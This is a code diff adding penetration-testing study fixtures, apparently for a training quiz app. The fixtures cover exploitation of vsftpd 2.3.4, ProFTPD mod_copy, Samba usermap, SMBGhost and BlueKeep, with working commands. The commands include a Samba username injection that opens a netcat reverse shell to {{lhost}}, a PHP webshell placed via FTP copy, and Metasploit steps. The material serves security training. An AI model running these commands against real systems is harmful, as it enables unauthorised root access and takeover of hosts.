@@ -6603,6 +6603,495 @@
         "pivot-chisel-socks": "Chisel is for when SSH is unavailable or you need a full proxy; here SSH gives you the forward directly.",
         "pivot-scan-through": "That scans through a SOCKS proxy you have not built; for one known service, forward it directly instead."
       }
+    },
+    "vsftpd-backdoor": {
+      "why": "The vsftpd 2.3.4 release shipped with a deliberate backdoor someone slipped into the source. When a username you send during login ends in the two characters that form a smiley, the daemon opens a root shell on port 6200 and waits. There is no password and no memory corruption, so it is completely reliable, but only on that one version. The whole skill is reading the banner, because the moment it says vsftpd 2.3.4 the box is already yours. Fingerprint it, trip the smiley, then connect to 6200.",
+      "cmd": "nmap -p21 -sV {{target}}",
+      "tool": "nmap",
+      "output": "PORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.3.4",
+      "signal": "vsftpd 2.3.4",
+      "teach": "The banner reads vsftpd 2.3.4, the one backdoored release. Log in with any username ending in a smiley, then connect to tcp/6200 for a root shell.",
+      "leadup": [
+        {
+          "key": "banner",
+          "label": "The FTP banner names the version",
+          "steps": [
+            {
+              "title": "Version-scan the port",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p21 -sV {{target}}",
+              "out": "21/tcp open  ftp     vsftpd 2.3.4",
+              "sig": "vsftpd 2.3.4",
+              "teach": "The version is the whole tell; 2.3.4 is the backdoored build and nothing else is."
+            }
+          ]
+        },
+        {
+          "key": "port",
+          "label": "FTP is open",
+          "steps": [
+            {
+              "title": "See the open port",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p21 {{target}}",
+              "out": "21/tcp open  ftp",
+              "sig": "21/tcp open",
+              "teach": "FTP is listening; fingerprint the version before you decide anything."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "vsftpd 2.3.4 is confirm the banner, send a smiley username to open the backdoor, then connect to port 6200 for root.",
+        "items": [
+          {
+            "t": "Fingerprint the version",
+            "d": "Only 2.3.4 is backdoored, so the version scan is the whole decision.",
+            "demo": [
+              {
+                "run": "nmap -p21 -sV {{target}}",
+                "out": "21/tcp open  ftp     vsftpd 2.3.4",
+                "sig": "vsftpd 2.3.4"
+              }
+            ],
+            "note": "Any other version, stop here and enumerate FTP normally."
+          },
+          {
+            "t": "Trip the backdoor",
+            "d": "Log in with a username whose last two characters form a smiley; the password is ignored.",
+            "demo": [
+              {
+                "run": "(printf 'USER hax:)\\r\\nPASS hax\\r\\n'; sleep 2) | nc {{target}} 21",
+                "out": "220 (vsFTPd 2.3.4)\n331 Please specify the password.",
+                "sig": "220 (vsFTPd 2.3.4)"
+              }
+            ],
+            "note": "The login hangs on purpose; the backdoor is now listening on 6200."
+          },
+          {
+            "t": "Connect to the root shell",
+            "d": "A second connection to tcp/6200 drops you straight into a root shell.",
+            "demo": [
+              {
+                "run": "nc {{target}} 6200",
+                "out": "id\nuid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "You are root; stabilise the shell and capture proof."
+          }
+        ]
+      },
+      "situation": "An FTP service answers on port 21 and nmap -sV reports the banner vsftpd 2.3.4. What is the move?",
+      "choices": [
+        "vsftpd-backdoor",
+        "online-brute-ftp",
+        "recon-ftp",
+        "ftp-upload-webshell"
+      ],
+      "coach": {
+        "online-brute-ftp": "No need to guess a password; this exact version hands you root through the smiley backdoor.",
+        "recon-ftp": "Anonymous enumeration is fine, but the 2.3.4 banner is a direct root shell, so take it.",
+        "ftp-upload-webshell": "That is for a writable FTP that reaches the web root; here the version itself is the exploit."
+      }
+    },
+    "proftpd-modcopy": {
+      "why": "ProFTPD 1.3.5 left SITE CPFR and SITE CPTO enabled for anyone, with no login. Those two commands copy a file the server can read to a path it can write, so if the web root is writable you copy a PHP payload into it and browse to your webshell. The real work is knowing where the web root is, which recon of the HTTP service usually reveals. No credentials, no upload form, just two FTP commands and a request.",
+      "cmd": "nmap -p21 -sV {{target}}",
+      "tool": "nmap",
+      "output": "PORT   STATE SERVICE VERSION\n21/tcp open  ftp     ProFTPD 1.3.5",
+      "signal": "ProFTPD 1.3.5",
+      "teach": "ProFTPD 1.3.5 exposes unauthenticated SITE CPFR and CPTO. Copy a PHP payload into a web-served directory, then request it for command execution.",
+      "leadup": [
+        {
+          "key": "banner",
+          "label": "The FTP banner names the version",
+          "steps": [
+            {
+              "title": "Version-scan the port",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p21 -sV {{target}}",
+              "out": "21/tcp open  ftp     ProFTPD 1.3.5",
+              "sig": "ProFTPD 1.3.5",
+              "teach": "The mod_copy commands are unauthenticated on 1.3.5, so the version is the gate."
+            }
+          ]
+        },
+        {
+          "key": "webroot",
+          "label": "You know a web-served path",
+          "steps": [
+            {
+              "title": "Find the web server on the same host",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s -I http://{{target}}/",
+              "out": "HTTP/1.1 200 OK\nServer: Apache/2.4.7 (Ubuntu)",
+              "sig": "Server: Apache",
+              "teach": "An Apache on the same host usually serves /var/www/html, which is your copy target."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "mod_copy is confirm 1.3.5, prove the copy works with a harmless file, then copy a PHP payload into the web root and call it.",
+        "items": [
+          {
+            "t": "Fingerprint the version",
+            "d": "The unauthenticated copy exists on 1.3.5 up to the patch, so confirm the banner first.",
+            "demo": [
+              {
+                "run": "nmap -p21 -sV {{target}}",
+                "out": "21/tcp open  ftp     ProFTPD 1.3.5",
+                "sig": "ProFTPD 1.3.5"
+              }
+            ],
+            "note": "A different version means mod_copy is likely patched or disabled."
+          },
+          {
+            "t": "Prove the copy primitive",
+            "d": "Copy a readable system file to a temp path to confirm CPFR and CPTO work before you stage a payload.",
+            "demo": [
+              {
+                "run": "nc {{target}} 21",
+                "out": "SITE CPFR /etc/passwd\n350 File or directory exists, ready for destination name\nSITE CPTO /tmp/passwd.copy\n250 Copy successful",
+                "sig": "250 Copy successful"
+              }
+            ],
+            "note": "A successful copy means you can write anywhere the FTP service user can."
+          },
+          {
+            "t": "Stage a webshell into the web root",
+            "d": "Copy a PHP payload into the directory the web server serves. The public exploit automates the two SITE commands.",
+            "demo": [
+              {
+                "run": "python2 36803.py {{target}} /var/www/html/",
+                "out": "[+] Copied payload to /var/www/html/shell.php",
+                "sig": "shell.php"
+              }
+            ],
+            "note": "Find the real web root first; /var/www/html is only the common default."
+          },
+          {
+            "t": "Run commands through it",
+            "d": "Request the webshell with a command; swap the command for a reverse-shell one-liner once it answers.",
+            "demo": [
+              {
+                "run": "curl 'http://{{target}}/shell.php?cmd=id'",
+                "out": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+                "sig": "www-data"
+              }
+            ],
+            "note": "You have execution as the web user; now upgrade to a shell and start enumerating for root."
+          }
+        ]
+      },
+      "situation": "FTP on port 21 banners as ProFTPD 1.3.5, and an Apache server runs on port 80. What is the move?",
+      "choices": [
+        "proftpd-modcopy",
+        "recon-ftp",
+        "online-brute-ftp",
+        "content-discovery"
+      ],
+      "coach": {
+        "recon-ftp": "Anonymous login may not even be needed; mod_copy writes a webshell without logging in.",
+        "online-brute-ftp": "No password required; the unauthenticated copy is the way in.",
+        "content-discovery": "Useful for finding the web root path, but the exploit itself is the FTP copy, not the directory brute."
+      }
+    },
+    "samba-usermap": {
+      "why": "Old Samba with the username map script option passes the SMB username straight into a shell command, so a username that is really a command runs as root. You send it through an anonymous connection to the IPC share, with a listener waiting, and the injected command calls back to you. It is one of the most reliable instant roots on legacy Linux, and it needs no credentials at all. Confirm the version sits in the vulnerable range first, because only the old builds carry it.",
+      "cmd": "nmap -p139,445 --script smb-os-discovery {{target}}",
+      "tool": "nmap",
+      "output": "Host script results:\n| smb-os-discovery:\n|   OS: Unix (Samba 3.0.20-Debian)",
+      "signal": "Samba 3.0.20",
+      "teach": "Samba 3.0.20 through 3.0.25rc3 runs the username through a shell. Put a command in the username field of an anonymous IPC connection and it executes as root.",
+      "leadup": [
+        {
+          "key": "version",
+          "label": "The Samba version is in range",
+          "steps": [
+            {
+              "title": "Discover the Samba version",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p139,445 --script smb-os-discovery {{target}}",
+              "out": "|   OS: Unix (Samba 3.0.20-Debian)",
+              "sig": "Samba 3.0.20",
+              "teach": "The injection works from 3.0.20 to 3.0.25rc3 only; newer Samba is patched."
+            }
+          ]
+        },
+        {
+          "key": "nullsession",
+          "label": "Anonymous SMB answers",
+          "steps": [
+            {
+              "title": "List shares with a null session",
+              "tool": "smbclient",
+              "where": "local",
+              "cmd": "smbclient -L //{{target}}/ -N",
+              "out": "Sharename       Type      Comment\nIPC$            IPC       IPC Service",
+              "sig": "IPC$",
+              "teach": "An anonymous IPC connection is the delivery channel for the injected username."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "usermap is confirm the version, start a listener, then connect to IPC$ with a command hidden in the username.",
+        "items": [
+          {
+            "t": "Fingerprint the version",
+            "d": "The bug is specific to 3.0.20 through 3.0.25rc3, so confirm before you inject.",
+            "demo": [
+              {
+                "run": "nmap -p139,445 --script smb-os-discovery {{target}}",
+                "out": "|   OS: Unix (Samba 3.0.20-Debian)",
+                "sig": "Samba 3.0.20"
+              }
+            ],
+            "note": "Outside that range the username-map injection does not apply."
+          },
+          {
+            "t": "Start your listener",
+            "d": "The injected command calls back to you, so have a listener ready before you connect.",
+            "demo": [
+              {
+                "run": "nc -lvnp 4444",
+                "out": "listening on [any] 4444 ...",
+                "sig": "listening on"
+              }
+            ],
+            "note": "The reverse connection will land here as root."
+          },
+          {
+            "t": "Inject through the username",
+            "d": "The username is evaluated by a shell, so a backtick command runs as the Samba process user, which is root.",
+            "demo": [
+              {
+                "run": "smbclient //{{target}}/ipc$ -N -U \"./=`nohup nc {{lhost}} 4444 -e /bin/sh`\"",
+                "out": "session setup failed: NT_STATUS_LOGON_FAILURE",
+                "sig": "NT_STATUS_LOGON_FAILURE"
+              }
+            ],
+            "note": "The login fails on purpose; the command already ran. Check your listener."
+          },
+          {
+            "t": "Confirm root on the catch",
+            "d": "Your listener now holds the shell; confirm the identity and stabilise it.",
+            "demo": [
+              {
+                "run": "id",
+                "out": "uid=0(root) gid=0(root) groups=0(root)",
+                "sig": "uid=0(root)"
+              }
+            ],
+            "note": "You are root; capture proof and enumerate for the flags."
+          }
+        ]
+      },
+      "situation": "SMB on 139 and 445 reports Samba 3.0.20-Debian, and an anonymous connection lists the IPC$ share. What is the move?",
+      "choices": [
+        "samba-usermap",
+        "recon-smb-anon",
+        "smb-share-inventory",
+        "eternalblue"
+      ],
+      "coach": {
+        "recon-smb-anon": "Null-session enumeration is fine, but this version gives you a root shell directly through the username field.",
+        "smb-share-inventory": "Listing shares is useful, yet the version itself is the exploit here.",
+        "eternalblue": "That is MS17-010 on Windows SMB; this is Linux Samba, a different and older command-injection bug."
+      }
+    },
+    "smbghost": {
+      "why": "A Windows 10 1903 or 1909 or Server 2019 host that speaks SMB 3.1.1 with compression mishandles a crafted compressed message, which an exploit turns into SYSTEM. The build and the protocol version matter completely, so the first move is to confirm both, and a scanner gives you a clear yes or no before you touch the exploit. The remote path is unstable and can blue-screen the target, so you snapshot the box and only fire it where a crash is acceptable. Treat the confirm step as the real skill, not the exploit.",
+      "cmd": "nmap -p445 --script smb-protocols {{target}}",
+      "tool": "nmap",
+      "output": "| smb-protocols:\n|   dialects:\n|     2:1:0\n|     3:0:0\n|     3:1:1",
+      "signal": "3:1:1",
+      "teach": "The host speaks SMB 3.1.1, the dialect the compression bug lives in. Confirm the exact build with a scanner, snapshot the box, then run the proof of concept.",
+      "leadup": [
+        {
+          "key": "dialect",
+          "label": "The host speaks SMB 3.1.1",
+          "steps": [
+            {
+              "title": "List the SMB dialects",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p445 --script smb-protocols {{target}}",
+              "out": "|     3:1:1",
+              "sig": "3:1:1",
+              "teach": "3.1.1 is required; older dialects do not have the compression feature the bug lives in."
+            }
+          ]
+        },
+        {
+          "key": "scanner",
+          "label": "A scanner confirms the bug",
+          "steps": [
+            {
+              "title": "Run the compression-flag scanner",
+              "tool": "python",
+              "where": "local",
+              "cmd": "python3 scanner.py {{target}}",
+              "out": "[+] 10.10.10.10 Vulnerable",
+              "sig": "Vulnerable",
+              "teach": "The scanner checks the compression capability flag, which is the real precondition, and is safe to run."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "SMBGhost is confirm SMB 3.1.1, run the scanner for a yes or no, snapshot the box, then the RCE proof of concept.",
+        "items": [
+          {
+            "t": "Confirm the dialect",
+            "d": "The bug lives in SMB 3.1.1 compression, so check the dialect before anything else.",
+            "demo": [
+              {
+                "run": "nmap -p445 --script smb-protocols {{target}}",
+                "out": "|     3:1:1",
+                "sig": "3:1:1"
+              }
+            ],
+            "note": "No 3.1.1, no SMBGhost; stop here."
+          },
+          {
+            "t": "Scan for the compression flag",
+            "d": "A dedicated scanner confirms the vulnerable build without touching memory, so it is your safe go or no-go.",
+            "demo": [
+              {
+                "run": "python3 scanner.py {{target}}",
+                "out": "[+] 10.10.10.10 Vulnerable",
+                "sig": "Vulnerable"
+              }
+            ],
+            "note": "Only a clear Vulnerable justifies risking the crash-prone exploit."
+          },
+          {
+            "t": "Snapshot, then run the PoC",
+            "d": "The RCE is unstable and can blue-screen the host, so snapshot or confirm a crash is acceptable first.",
+            "demo": [
+              {
+                "run": "python3 SMBGhost_RCE.py -ip {{target}}",
+                "out": "[+] Shellcode executed, check your listener",
+                "sig": "check your listener"
+              }
+            ],
+            "note": "Edit the embedded shellcode to call back to {{lhost}}, and catch SYSTEM on your listener."
+          }
+        ]
+      },
+      "situation": "A host answers SMB on 445 speaking dialect 3.1.1, and it is Windows 10 build 1903. What is the move?",
+      "choices": [
+        "smbghost",
+        "eternalblue",
+        "recon-smb-anon",
+        "smb-share-inventory"
+      ],
+      "coach": {
+        "eternalblue": "MS17-010 is a different, older SMBv1 bug; 3.1.1 with compression is SMBGhost territory.",
+        "recon-smb-anon": "Enumeration is worth doing, but a confirmed SMBGhost build is a direct path to SYSTEM.",
+        "smb-share-inventory": "Listing shares needs access you may not have; the compression bug needs none."
+      }
+    },
+    "bluekeep": {
+      "why": "RDP on Windows 7 and Server 2008 R2 has a pre-authentication flaw that reaches SYSTEM with no login. The exploit is powerful but fragile, so the discipline is to confirm the host is vulnerable, choose the exact target profile the module asks for, and accept that a wrong guess blue-screens the box instead of landing a shell. Confirm first, fire only where a crash is acceptable, and have your listener ready before you run it.",
+      "cmd": "nmap -p3389 --script rdp-vuln-ms19-0708 {{target}}",
+      "tool": "nmap",
+      "output": "| rdp-vuln-ms19-0708:\n|   VULNERABLE:\n|   Remote Desktop Protocol CVE-2019-0708\n|     State: VULNERABLE",
+      "signal": "VULNERABLE",
+      "teach": "The nmap script marks the host VULNERABLE to CVE-2019-0708. Pick the matching target profile in the exploit, then fire it where a crash is acceptable.",
+      "leadup": [
+        {
+          "key": "confirm",
+          "label": "The host is confirmed vulnerable",
+          "steps": [
+            {
+              "title": "Run the RDP vuln script",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p3389 --script rdp-vuln-ms19-0708 {{target}}",
+              "out": "|   VULNERABLE:\n|     State: VULNERABLE",
+              "sig": "VULNERABLE",
+              "teach": "This is the go or no-go; the PoC crashes targets that are not vulnerable."
+            }
+          ]
+        },
+        {
+          "key": "port",
+          "label": "RDP is open",
+          "steps": [
+            {
+              "title": "See the open RDP port",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p3389 {{target}}",
+              "out": "3389/tcp open  ms-wbt-server",
+              "sig": "3389/tcp open",
+              "teach": "RDP is listening; the version and patch level decide whether BlueKeep applies."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "BlueKeep is confirm vulnerable, set the right target profile, ready a listener, then fire and accept the crash risk.",
+        "items": [
+          {
+            "t": "Confirm the host is vulnerable",
+            "d": "The nmap script is non-destructive and tells you whether the patch is missing.",
+            "demo": [
+              {
+                "run": "nmap -p3389 --script rdp-vuln-ms19-0708 {{target}}",
+                "out": "|   VULNERABLE:",
+                "sig": "VULNERABLE"
+              }
+            ],
+            "note": "Never fire blind; the PoC blue-screens targets that are not vulnerable."
+          },
+          {
+            "t": "Set the target profile",
+            "d": "The module needs the memory layout for the target's platform and version; the wrong profile crashes it.",
+            "demo": [
+              {
+                "run": "msf6 exploit(cve_2019_0708_bluekeep_rce) > set target 2",
+                "out": "target => 2",
+                "sig": "target => 2"
+              }
+            ],
+            "note": "Match the profile to the host (physical, VMware, or Hyper-V) as the module notes describe."
+          },
+          {
+            "t": "Fire and catch SYSTEM",
+            "d": "With the profile set and a handler ready, run the exploit and watch for a session.",
+            "demo": [
+              {
+                "run": "msf6 exploit(cve_2019_0708_bluekeep_rce) > run",
+                "out": "[*] Meterpreter session 1 opened",
+                "sig": "session 1 opened"
+              }
+            ],
+            "note": "A session is SYSTEM; if it blue-screens instead, revisit the target profile."
+          }
+        ]
+      },
+      "situation": "RDP is open on 3389 and the nmap rdp-vuln script reports the host VULNERABLE to CVE-2019-0708. What is the move?",
+      "choices": [
+        "bluekeep",
+        "online-brute-rdp",
+        "rdp-enum",
+        "smbghost"
+      ],
+      "coach": {
+        "online-brute-rdp": "No credentials are needed; this is a pre-auth RCE, though it carries a crash risk that brute-forcing does not.",
+        "rdp-enum": "Enumeration confirmed the version already; the script says vulnerable, so the exploit is the move.",
+        "smbghost": "That is the SMBv3 compression bug on 445; this is the RDP pre-auth bug on 3389."
+      }
     }
   };
   Object.keys(GAPFILL5G).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL5G[k]; });
